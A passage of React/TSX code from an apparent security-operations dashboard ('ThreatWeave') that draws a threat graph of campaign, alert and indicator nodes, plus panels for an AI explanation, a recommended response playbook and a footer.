                  const srcNode = graphData.nodes.find((n) => n.id === edge.source);
                  const tgtNode = graphData.nodes.find((n) => n.id === edge.target);

                  if (!srcNode || !tgtNode) return null;

                  const isHighlit = selectedNodeDetails?.id === srcNode.id || selectedNodeDetails?.id === tgtNode.id;

                  return (
                    <g key={edge.id} className="transition-all duration-300">
                      <line
                        x1={srcNode.x}
                        y1={srcNode.y}
                        x2={tgtNode.x}
                        y2={tgtNode.y}
                        stroke={isHighlit ? "#14b8a6" : "#1e293b"}
                        strokeWidth={isHighlit ? 2.5 : 1.2}
                        strokeDasharray={isHighlit ? "4 4" : "none"}
                        className={isHighlit ? "animate-[dash_20s_linear_infinite]" : "opacity-80"}
                        markerEnd={isHighlit ? "url(#arrow-glowing)" : "url(#arrow)"}
                      />
                    </g>
                  );
                })}

                {/* Draw nodes */}
                {graphData.nodes.map((node) => {
                  const isCampNode = node.type === "campaign";
                  const isAlertNode = node.type === "alert";
                  const isSelected = selectedNodeDetails?.id === node.id;

                  // Define node styling variables based on type
                  let fill = "#0f172a";
                  let stroke = "#334155";
                  let radius = 10;
                  let ringColor = "transparent";

                  if (isCampNode) {
                    fill = "#0d1b1d";
                    stroke = "#14b8a6";
                    radius = 22;
                    ringColor = "#14b8a6";
                  } else if (isAlertNode) {
                    fill = node.severity === Severity.CRITICAL ? "#1a1215" : "#141517";
                    stroke = node.severity === Severity.CRITICAL ? "#f43f5e" : "#f59e0b";
                    radius = 14;
                    ringColor = stroke;
                  } else {
                    // Indicators / IOC nodes
                    fill = "#030712";
                    stroke = "#475569";
                    radius = 11;
                  }

                  return (
                    <g
                      key={node.id}
                      transform={`translate(${node.x}, ${node.y})`}
                      onClick={(e) => {
                        e.stopPropagation();
                        setSelectedNodeDetails({
                          id: node.id,
                          label: node.label,
                          type: node.type,
                          details: node.details
                        });
                      }}
                      className="cursor-pointer group select-none"
                    >
                      {/* Pulse ring animation if selected */}
                      {isSelected && (
                        <circle
                          r={radius + 8}
                          fill="none"
                          stroke={ringColor}
                          strokeWidth="1.5"
                          className="animate-ping opacity-45"
                        />
                      )}

                      {/* Outer visual highlight ring for interactive focus */}
                      <circle
                        r={radius + 4}
                        fill="transparent"
                        stroke={isSelected ? stroke : "transparent"}
                        strokeWidth="1.5"
                        className="transition-all"
                      />

                      {/* Inner Node Body Card */}
                      <circle
                        r={radius}
                        fill={fill}
                        stroke={stroke}
                        strokeWidth="2"
                        className="transition-all duration-200 group-hover:scale-110 shadow-lg"
                      />

                      {/* Core Icon Indicator inside Campaign / Alerts */}
                      {isCampNode ? (
                        <polygon
                          points="-5,-5 7,0 -5,5"
                          fill="#14b8a6"
                          transform="translate(1,0)"
                        />
                      ) : (
                        <circle r="3" fill={stroke} />
                      )}

                      {/* Descriptive Subtext Label tag */}
                      <text
                        y={radius + 18}
                        className={`text-[9px] font-mono font-semibold transition-all text-center select-none ${
                          isSelected ? "fill-teal-300 font-bold" : "fill-slate-400 group-hover:fill-slate-250"
                        }`}
                        textAnchor="middle"
                      >
                        {node.label}
                      </text>
                    </g>
                  );
                })}
              </svg>

              {/* Side Node Inspector Overlay (Fades in based on graph node clicks) */}
              {selectedNodeDetails && (
                <div className="absolute bottom-4 left-4 right-4 bg-slate-900/90 backdrop-blur-md p-3 rounded-lg border border-slate-800 text-xs shadow-xl animate-fade-in z-20 flex gap-3 items-start justify-between">
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[10px] bg-slate-850 px-1.5 py-0.5 rounded text-teal-400 font-bold uppercase font-mono border border-teal-500/10">
                        {selectedNodeDetails.type}
                      </span>
                      <h4 className="font-bold text-slate-200 truncate">
                        {selectedNodeDetails.label}
                      </h4>
                    </div>
                    <p className="text-slate-400 leading-normal max-w-xl">
                      {selectedNodeDetails.details || "Analyzed network coordinate metadata sequence. Use cyber action procedures below to address."}
                    </p>
                  </div>
                  <button
                    onClick={() => setSelectedNodeDetails(null)}
                    className="p-1 hover:bg-slate-800 rounded text-slate-500 hover:text-white"
                  >
                    <X className="h-4 w-4" />
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Bottom Area: Dynamic Explainable AI Layer & Tactical Recommended Actions Checklist */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

            {/* Left: Explainable AI Overlay Panel */}
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl flex flex-col min-h-[300px]">
              <div className="flex items-center justify-between pb-3 border-b border-slate-850 mb-4 bg-slate-900/40">
                <div className="flex items-center gap-2">
                  <Cpu className="h-4 w-4 text-teal-400" />
                  <span className="font-semibold text-xs uppercase tracking-wider text-white">
                    Explainable AI (XAI) Logical Flow
                  </span>
                </div>
                <span className="text-[10px] text-slate-500 font-mono">
                  Confidence Score: {activeCampaign.confidence}%
                </span>
              </div>

              <div className="flex-1 overflow-y-auto max-h-[220px] text-xs leading-relaxed text-slate-350 bg-slate-950/40 p-4 rounded-lg font-mono border border-slate-850/60 whitespace-pre-line">
                {activeCampaign.aiExplanation}
              </div>
            </div>

            {/* Right: Security Incident Recovery Tasks */}
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl flex flex-col min-h-[300px]">
              <div className="flex items-center justify-between pb-3 border-b border-slate-850 mb-4">
                <div className="flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-emerald-400" />
                  <span className="font-semibold text-xs uppercase tracking-wider text-slate-100">
                    Recommended Security Playbook
                  </span>
                </div>
                <span className="text-[10px] text-rose-400 font-mono font-medium animate-pulse">
                  CRITICAL TASK FORCE
                </span>
              </div>

              <div className="flex-1 flex flex-col gap-2 overflow-y-auto max-h-[220px]">
                {activeCampaign.recommendedActions.map((act, index) => (
                  <div
                    key={index}
                    className="flex p-3 bg-slate-950/40 border border-slate-850/70 rounded-lg hover:border-slate-800 transition-all items-start gap-3 text-xs"
                  >
                    <div className="h-5 w-5 bg-teal-500/10 border border-teal-500/30 text-teal-400 shrink-0 rounded flex items-center justify-center font-bold text-[10px] mt-0.5">
                      {index + 1}
                    </div>
                    <div className="flex-1">
                      <p className="text-slate-300 font-medium leading-relaxed">
                        {act}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>

        </div>

      </main>

      {/* Structured Security Status Footer */}
      <footer className="border-t border-slate-800/80 bg-slate-900/30 px-6 py-4 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
          <span>
            ThreatWeave Security Information Operations Center — Unified AI Guard Engine. All rights reserved.
          </span>
          <div className="flex justify-center gap-3 font-mono text-[10px] text-slate-450 mt-1 sm:mt-0">
            <span>REGISTRY: GLOBAL-V1.0</span>
            <span>|</span>
            <span>NODE_CONNECT: CLOUD_RUN_CONTAINER</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
